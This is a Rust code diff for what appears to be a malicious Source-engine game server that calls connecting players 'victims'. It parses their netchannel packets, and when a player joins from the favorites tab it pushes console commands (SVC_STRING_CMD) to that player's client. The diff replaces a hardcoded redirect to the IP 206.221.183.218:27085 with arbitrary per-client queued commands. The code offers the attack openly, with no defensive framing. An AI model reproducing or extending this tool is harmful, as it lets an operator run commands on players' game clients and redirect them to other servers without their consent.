@@ -10,7 +10,7 @@ use crate::Client;
 mod util;
 use util::*;
 
-mod messages;
+pub mod messages;
 use messages::{process_messages, Messages};
 
 pub fn handle_stateful(
@@ -20,7 +20,7 @@ pub fn handle_stateful(
     data: &[u8],
 ) {
     // Get the client/victim
-    let victim = match clients.get_mut(&addr) {
+    let mut victim = match clients.get_mut(&addr) {
         Some(victim) => victim,
         None => {
             // Welcome our client to netchannel
@@ -41,8 +41,6 @@ pub fn handle_stateful(
     let flags = data[8];
     let checksum = u16::from_le_bytes(data[9..11].try_into().unwrap());
     // Verify the checksum before we continue
-    //println!("{} != {} ?", checksum, valve_checksum((&data[11..])));
-    //println!("{:#?}", &data);
     if valve_checksum(&data[11..]) == checksum {
         let rel = data[11];
         let mut off = 12;
@@ -61,7 +59,6 @@ pub fn handle_stateful(
 
         let read_buf = BitReadBuffer::new(&data[off..], LittleEndian);
         let mut reader = BitReadStream::new(read_buf);
-        let mut writer = BitWriteStream::new(LittleEndian);
         if flags & 0x01 != 0 {
             // Check which bit in the reliable state we need to flip
             victim.flip_rel(reader.read_int(3).unwrap());
@@ -70,7 +67,7 @@ pub fn handle_stateful(
                 let msgs = parse_subchannel(&mut reader);
                 println!("{:#?}", &msgs);
                 let packets = build_packets(
-                    handle_messages(msgs),
+                    handle_messages(&mut victim, msgs),
                     &mut ack,
                     seq,
                     rel,
@@ -86,7 +83,7 @@ pub fn handle_stateful(
         let msgs = process_messages(&mut reader);
         println!("{:#?}", &msgs);
         let packets = build_packets(
-            handle_messages(msgs),
+            handle_messages(&mut victim, msgs),
             &mut ack,
             seq,
             rel,
@@ -127,7 +124,7 @@ fn build_packets(
             }
             Messages::SVC_STRING_CMD { command } => {
                 writer.write_int(4u8, 6).unwrap();
-                writer.write_string(&command, None);
+                writer.write_string(&command, None).unwrap();
             }
             _ => todo!("TODO: Serialize {:#?}", message),
         }
@@ -155,16 +152,14 @@ fn build_packets(
     packets
 }
 
-fn handle_messages(messages: Vec<Messages>) -> Vec<Messages> {
+fn handle_messages(client: &mut Client, messages: Vec<Messages>) -> Vec<Messages> {
     let mut results = Vec::new();
     for msg in messages {
         match msg {
             Messages::NET_SET_CONVARS { convars } => {
                 if let Some(method) = convars.get("cl_connectmethod") {
                     if method == "serverbrowser_favorites" {
-                        results.push(Messages::SVC_STRING_CMD {
-                            command: "redirect 206.221.183.218:27085".to_string(),
-                        });
+                        results.append(&mut client.queued);
                     } else {
                         results.push(Messages::NET_DISCONNECT {
                             reason: "You must join this server from the favorites tab!".to_string(),
